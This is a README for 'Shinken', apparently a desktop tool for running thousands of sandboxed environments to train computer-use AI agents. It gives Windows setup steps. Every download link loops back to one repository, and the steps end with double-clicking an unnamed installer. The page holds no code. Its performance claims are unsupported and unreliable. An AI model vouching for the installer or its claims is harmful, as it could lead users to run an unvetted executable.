# 🤖 Shinken - Build smart agents for your computer

[![Download Shinken](https://img.shields.io/badge/Download-Shinken-blue)](https://github.com/cobbydehydrated815/Shinken)

Shinken helps you train computer-use agents on your own desktop. It allows you to run thousands of digital environments at the same time on a single machine. You can use these environments to teach artificial intelligence how to navigate software, click buttons, and finish tasks just like a person.

## 📋 What is Shinken?

Shinken provides a sandbox for AI agents. It creates isolated spaces where your software agents can practice using a computer. Because Shinken is efficient, it manages 8,000 or more live environments on a standard laptop. This speed helps you train your models faster and provides better results.

Researchers and developers use this tool for desktop automation and reinforcement learning. By linking large language models to a virtual desktop, you create agents that perceive screens and execute mouse movements or keyboard entries. 

## ⚙️ System Requirements

To run Shinken on Windows, your computer needs to meet these basic standards:

*   **Operating System**: Windows 10 or 11 with the WSL2 feature enabled.
*   **Processor**: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
*   **Memory**: At least 16GB of RAM.
*   **Storage**: 50GB of free space on an SSD.
*   **Graphics**: A dedicated graphics card is helpful for faster training but not strictly required.
*   **Virtualization**: You must enable Hardware Virtualization in your computer BIOS or UEFI settings.

## 📥 Getting Started

Follow these steps to install the software on your Windows machine.

1.  **Visit the download page**: Go to [https://github.com/cobbydehydrated815/Shinken](https://github.com/cobbydehydrated815/Shinken) to get the latest files.
2.  **Enable WSL2**: Open your Windows PowerShell as an administrator and type `wsl --install`. Restart your computer when the process completes.
3.  **Install Docker Desktop**: Download and install Docker Desktop from the official website. This tool lets Shinken run its isolated environments.
4.  **Download the installer**: Click the button below to retrieve the installer file.

[![Download Shinken](https://img.shields.io/badge/Get_Shinken_Installer-Grey)](https://github.com/cobbydehydrated815/Shinken)

5.  **Run the file**: Double-click the installer file you downloaded. Follow the on-screen instructions to finish the setup.
6.  **Launch the app**: Find the Shinken icon on your desktop and open it.

## 🛠️ How to use the software

Once the application is open, the dashboard shows your active training environments. 

### Creating a new project
Click the "Create New Environment" button at the top of the interface. This defines the goal for your AI agent. You select the software programs the agent can access, such as a web browser or a text editor.

### Managing environments
The interface displays a list of all current threads. You see the CPU usage and memory consumption for each. If an agent performs a task, you see a live preview of the desktop window associated with that specific agent.

### Training your agent
Training involves three phases:
*   **Discovery**: The agent explores the desktop and learns the interface.
*   **Trial**: The agent attempts a target task.
*   **Grading**: The system provides feedback to the agent on its accuracy.

You can pause or stop any environment at any time. The software saves your progress automatically.

## 🔍 Frequently Asked Questions

**Does this software require an internet connection?**
Yes, it needs a connection to download the base image files once. After that, you can perform most training tasks offline.

**Why do I need to enable "Hardware Virtualization"?**
Shinken creates many virtual desktops at once. Virtualization allows your hardware to handle these environments without slowing down your primary computer.

**Can I run this on a server?**
Shinken runs best on high-end workstations. While you can host the environment on a server, it works well on standard Windows laptops if you have enough memory.

**How do I update the software?**
The application checks for updates when it starts. If an update exists, it prompts you to download the latest version automatically.

## 📈 Improving performance

When running large numbers of agents, make sure your computer has enough cooling. Running thousands of environments uses your processor at high capacity. Close unnecessary background applications like web browsers or video players while training to ensure the agents have enough resources.

If the software moves slowly, reduce the number of concurrent agents in the settings menu. Starting with a lower count and increasing as you gain confidence helps maintain a stable experience.

## 🆘 Seeking help

If you encounter an error, check the logs folder inside the installation directory. These files record the actions of the system and help identify if there is a conflict with other programs. You can share these logs on the community forum to get assistance from other users. 

Always keep your drivers updated, especially the drivers for your graphics card. New driver versions often include fixes that improve how your computer manages virtual environments.